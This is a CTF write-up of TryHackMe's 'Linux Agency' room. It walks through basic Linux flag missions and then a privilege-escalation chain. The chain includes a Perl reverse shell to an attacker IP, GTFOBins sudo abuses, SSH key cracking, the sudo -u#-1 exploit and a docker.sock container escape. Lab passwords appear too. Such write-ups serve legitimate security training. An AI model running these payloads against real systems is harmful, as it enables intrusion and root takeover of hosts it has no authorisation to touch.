---
title: "Linux Agency(THM)"
permalink: /writeups/agency
---

# <a href="https://tryhackme.com/room/linuxagency" target="_blank">Linux Agency - THM</a>

![Linux Agency Logo](/writeups/LinuxAgency/logo.jpeg "Logo")

## Tags
docker, sudo, linux, privesc

## Metadata

| Written | 11/11/2022
| Author | Thetvdh
| Platform | TryHackMe
| Box Type | Linux

## Tools used

- John The Ripper
- Vim
- Docker
- find
- grep
- cat
- less
- python
- base64
- CyberChef
- gunzip
- GTFOBins



# Introduction

This is my writeup of the Linux Agency box on TryHackMe. Due to the size of this box I will be skimming over the large part of this box, Mission1 - Viktor. Instead of the usual indepth on each flag I will just quickly say how to get the flag and move on. The privesc section will be more indepth as that was quite interesting to me. For the purposes of this box the target IP 10.10.9.158

# Linux Section - Mission1 - Viktor

## Mission1

```
ssh agent47@10.10.9.158
```
Password is given to us as 640509040147

mission1 is in the ssh motd

```
su mission1
```

## Mission2
```
cd ~
ls
su mission2
```

## Mission3
```
cd ~
ls
cat flag.txt
su mission3
```

## Mission4
```
cd ~
ls
less flag.txt
su mission4
```

## Mission5
```
cd ~
ls
cd flag/
ls
cat flag.txt
su mission5
```

## Mission6
```
cd ~
ls -la
cat .flag.txt
su mission6
```

## Mission7
```
cd ~
ls -la
cd .flag
cat flag.txt
su mission7
```

## Mission8
```
cd /home/mission7/
ls
cat flag.txt
su mission8
```

## Mission9
```
cd ~
find / -name flag.txt 2>/dev/null
cat /flag.txt
su mission9
```

## Mission10
```
cd ~
grep -i mission10{ rockyou.txt
su mission10
```

## Mission11
```
cd ~
ls
cd folder
ls
find . -name flag.txt 2>/dev/null
cat ./L4D8/L3D7/L2D2/L1D10/flag.txt
su mission11
```

## Mission12
```
cd ~
printenv
su mission12
```

## Mission13
```
cd ~
ls
chmod 700 flag.txt
su mission13
```

## Mission14
```
cd ~
ls
cat flag.txt
base64 -d flag.txt
su mission14
```

## Mission15
```
cd ~
ls
cat flag.txt
Put into an online binary decoder of your choice. I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Binary('None',8)&input=MDExMDExMDEwMTEwMTAwMTAxMTEwMDExMDExMTAwMTEwMTEwMTAwMTAxMTAxMTExMDExMDExMTAwMDExMDAwMTAwMTEwMTAxMDExMTEwMTEwMTEwMDExMDAxMTAwMDExMDAxMTAxMDAwMDExMTAwMTAwMTEwMDAxMDAxMTAxMDEwMTEwMDEwMDAwMTExMDAwMDAxMTAwMDEwMDExMTAwMDAxMTAwMDEwMDExMDAxMTAwMTEwMDAwMTAxMTAwMTAxMDExMDAxMTAwMTEwMDExMDAwMTEwMDAwMDAxMTAwMDEwMDExMDAwMTAwMTExMDAwMDAxMTAxMDEwMTEwMDAxMTAwMTEwMDExMDAxMTAxMDEwMDExMDEwMDAwMTEwMTExMDExMDAxMTAwMDExMDAxMDAwMTEwMTAxMDAxMTAxMDEwMDExMTAwMTAwMTEwMTEwMDExMTExMDEK)
su mission15
```

## Mission16
```
cd ~
ls
cat flag.txt
Put into a online hex decoder of your choice, I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NkQ2OTczNzM2OTZGNkUzMTM2N0IzODM4MzQzNDMxMzc2NDM0MzAzMDMzMzM2MzM0NjMzMjMwMzkzMTYyMzQzNDY0Mzc2MzMyMzY2MTM5MzAzODY1N0QK)
su mission16
```

## Mission17
```
cd ~
ls
file flag
chmod 700 flag
./flag
su mission17
```

## Mission18
```
cd ~
ls
javac flag.java
java flag
su mission18
```

## Mission19
```
cd ~
ls
ruby flag.rb
su mission19
```

## Mission20
```
cd ~
ls
gcc -o flag flag
./flag
su mission20
```

## Mission21
```
cd ~
ls 
python3 flag.py
su mission21
```

## Mission22
```
cd ~
bash
su mission22
```

## Mission23
```
import os
os.system("/bin/bash")
cd
cat flag.txt
su mission23
```

## Mission24
```
cd ~
ls
cat message.txt
curl localhost -o page.html
grep -i "mission" page.html
```

## Mission25
```
cd ~
./bribe
export pocket=money
su mission25
```

## Mission26
```
cd ~
/bin/cat flag.txt
/bin/su mission26
```

## Mission27
```
cd ~
ls
vim flag.jpg
:q!
su mission27
```

## Mission28
```
cd ~
ls
gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
cat flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
su mission28
```

## Mission29
```
system("/bin/bash")
cd ~
ls
cat txt.galf | rev
su mission29
```

## Mission29
```
cd ~
ls
cd bludit
ls -la
cat .htpasswd
su mission30
```

## Mission30
```
cd ~
ls -la
cd Escalator/
ls
git log
su viktor
```

## Wrap

That concludes the linux fundamentals part of this box, now it gets more interesting!

# Privesc

By the look of the challenges we need to go from person to person up to root. Let's get cracking!

For a large amount of these privsecs I used [https://gtfobins.github.io](https://gtfobins.github.io) It's a really good set of documentation about the different methods you can use to exploit binaries.

## Viktor -> Dalia

To escalate from Viktor to Dalia we need to abuse the crontab.

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
#
```

Essentially every minute root writes the following into /opt/scripts/47.sh
```sh
#!/bin/bash
#echo "Hello 47"
rm -rf /dev/shm/
#echo "Here time is a great matter of essence"
rm -rf /tmp/
```

Then after 30 seconds the crontab runs that file as Dalia. So what we need to do is after the root cronjob writes to the file is replace the contents with our own payload. 

We're going to use a Perl reverse shell

Steps:
1) `tail -f 47.sh` Allows us to see when the content gets written
2) Write this into the file after the content is modified by the cronjob
```perl
#!/bin/bash
perl -e 'use Socket;$i="{attacker_ip}";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
3) Setup a netcat reverse listener (with magical potential!!)
```
/bin/bash
nc -lvnp 4242
```
4) Wait for the connection


## Shell stabilisation

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo;fg
ENTER
```

Now we have a lovely shell with tab autocomplete and that doesn't die when you CTRL+C

Now let's keep going

## Dalia -> Silvio
```
sudo -l
export TF=$(mktemp -u)
sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
bash
cd ~
cat flag.txt
```

Here we are exploiting the fact we can run zip as silvio. This allows us to get a sh session as silvio which we can then change into a bash session.

## Silvio -> Reza
```
sudo -l
sudo -u reza PAGER='bash -c "exec bash 0<&1"' git -p help
cd ~
cat flag.txt
```

## Reza -> Jordan
```
sudo -l
cd /tmp
touch shop.py
vim shop.py
Inside shop.py:
	import os
	os.system("/bin/bash")

sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py 
cd ~
cat flag.txt | rev
```

## Jordan -> Ken
```
sudo -l
sudo -u ken /usr/bin/less /home/ken/flag.txt
!sh
bash
cd ~
cat flag.txt
```

## Ken -> Sean
```
sudo -l
sudo -u sean /usr/bin/vim
:!sh
bash
cd ~
```

Sean is a fun one. This took me a while to work out and with a little help from Linpeas I got it!

```
groups
find / -group adm 2>/dev/null
grep -i sean{ /var/log/* 2>/dev/null
```

Essentially, Sean is part of the adm group which is a non standard group. This set of alarm bells as this isn't something that usually occurs. This makes me think there is something special about this group.

The find command searches for all files belonging to this group and there is a large amount of log files

Log files are good for finding passwords so by association flags may also be there. The grep command searches through every file and redirects the errors so it doesn't clog our terminal up.

## Sean -> Penelope

There is also a base64 string which we can decode using the base64 command
```
echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d 
```

This tells us the password for the penelope user account.

So we have something a little more stable we're going to use a fresh SSH session
```
ssh agent47@10.10.9.158

640509040147
su penelope
cd ~
```

## Penelope -> Maya
```
ls
./base64 /home/maya/flag.txt | ./base64 -d
su maya
```

Maya's password is the flag you get from the file

Base64 has a SUID bit set which means when we run it, we run it as the user that owns the file, in this case maya. This means we can read Maya's files using the base64 binary

## Maya -> Robert

Another interesting one as robert seemingly doesn't exist. Lets research shall we.

Looking at the files in Maya's home directory we have a folder called "old_robert_ssh" and a text file called "elusive_targets.txt"

elusive_targets.txt is as follows
```
Welcome 47 glad you made this far.
You have made our Agency very proud.

But, we have a last unfinished job which is to infiltrate kronstadt industries.
He has a entrypoint at localhost.

Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
Robert is involved to be illegally hacking into our server's.

He was able to transfer the .ssh folder from robert's home directory.

The old .ssh is kept inside old_robert_ssh directory incase you need it.

Good Luck!!!
    47
```

Ok we we need to get into Robert's "entrypoint" using his ssh creds.

```
cd old_robert_ssh
cat id_rsa
```
So we have a private key. We can crack it with John The Ripper

1) Copy the contents of id_rsa into a file on our kali machine
2) run ssh2john id_rsa > hash.txt
3) john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

This will give us a passphrase for Robert but we need somewhere to put it. It mentions localhost however we need to find what this means. For this we are going to use the nmap static binary which can be downloaded from [here](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap)

### nmap scan

Uploading the binary:
1) Download the [binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap)
2) cd into the directory with the nmap binary and setup a Python http server
```
Attacker Machine:
python3 -m http.server 8080
```
3) Download the binary
```
Target Machine:
wget http://attacker_ip:8080/nmap
```
4) Run nmap
```
chmod 700 nmap
./nmap localhost -p-
```

That gives u some results
```
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00016s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
631/tcp   open  ipp
2222/tcp  open  unknown
36445/tcp open  unknown

```

We know about http and SSH as we saw those earlier in the challenge. We SSHed into the box originally and used curl to access the HTTP server in challenge 24.

IPP is Internet Printing Protocol, this could potentially be a vulnerability but lets check the other ports first as we have SSH information.

Unfortunately we cannot nmap the ports to find out the service so we shall curl it.

```
curl localhost:2222
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
Protocol mismatch.
```

Lovely stuff, we now know it is an ssh port so we can SSH into it as robert

```
ssh robert@localhost -p 2222 -i id_rsa
```

## Robert -> Root (sorta)

So this is a docker container. We can tell because we have a .dockerenv file and also there is only 1 user in the /home directory. We can't be on a seperate machine as we SSHed into localhost so it must be a container.

Now we need to escalate in this container so we can break out of it.

Running sudo -l shows us that everyone but root can run /bin/bash as sudo. This is not a normal sudoers entry so this implies it could be relevant

Sudo has a large amount of vulnerabilities over it's versions. This means we could potentially have a vulnerable sudo version. 

```
sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```

A quick google leads us to [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502) which shows us a lovely sudo exploit

```
sudo -u#-1 /bin/bash
cd /root
cat user.txt
```
Now we have root on the container. Now we need to break out.



## Container escape

Being root gives us some options for container escape. A good place to look is always docker.sock as if we have write permissions for it we can use that as a method of escape!

`find / -name docker.sock`

We have a docker.sock file, let's have a look at it
```
ls -la /run/docker.sock
```

This is very good for us. We can write to the docker sock. This means we can escape using a simple command or two.

Note: This is a very good guide by hacktricks, highly recommend. [Docker Escape Guide](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)

First we need to find out what this image is called using

```
docker images
bash: docker: command not found
```

Oh. That's not ideal. So we don't have the docker command. Let's check the path

```
echo $PATH
```

It appears that the path is normal. Unfortunately that means we need to look around a bit more. We can do a search for the binary using find.

Note: Learn the find command, it's really helpful!

```
find / -name docker -type f 2>/dev/null
/tmp/docker
```

Lovely, now we have a binary. The -type f means just look for files so it ignores any folders.

So let's try our docker images again

```
cd /tmp
./docker images
```
Lovely that works!

Now we can get the final escalation

```
./docker run -it -v /:/host/ mangoman chroot /host/ bash
cd /root
cat root.txt
```

# Conclusion

There we have it! We have completed the box. It is a really long box but a really fun one. I think this would be a great teaching box from the bottom all the way to intermediate to advanced. It forces research and allows people to learn about all sorts of different privesc vectors including sudo abuse, SUID binaries, vulnerable versions, misconfiguration, and others! Overall I would highly recommend the box to people of all skill levels, the earlier levels are good for beginners and the final privesc tasks are good for intermediate or advanced users.